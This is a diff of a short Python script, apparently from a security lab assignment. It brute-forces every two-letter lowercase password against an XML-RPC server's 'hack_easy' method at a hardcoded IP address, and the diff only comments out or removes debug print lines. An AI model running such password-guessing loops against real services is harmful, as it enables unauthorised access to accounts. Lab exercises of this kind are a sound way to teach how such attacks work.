@@ -6,8 +6,8 @@ import xmlrpc.client
 # lowercase ascii letters
 combinations = [''.join(i) for i in product(ascii_lowercase, repeat = 2)]
 
-s = xmlrpc.client.ServerProxy('http://128.39.145.79:8080')
-print(s)
+#s = xmlrpc.client.ServerProxy('http://128.39.145.79:8080')
+#print(s)
 
 # For each combination in the list
 for combination in combinations:
@@ -15,10 +15,11 @@ for combination in combinations:
         print("\nTrying ", combination)
         # Create connection
         s = xmlrpc.client.ServerProxy('http://128.39.145.79:8080')
+
         # Run the hack_easy method from the connection, with the current
         # combination as password
         success = s.hack_easy(combination, "whiterose, group3")
-        print(s)
+
         if (success!='success'):
             print("Try again")
         else:
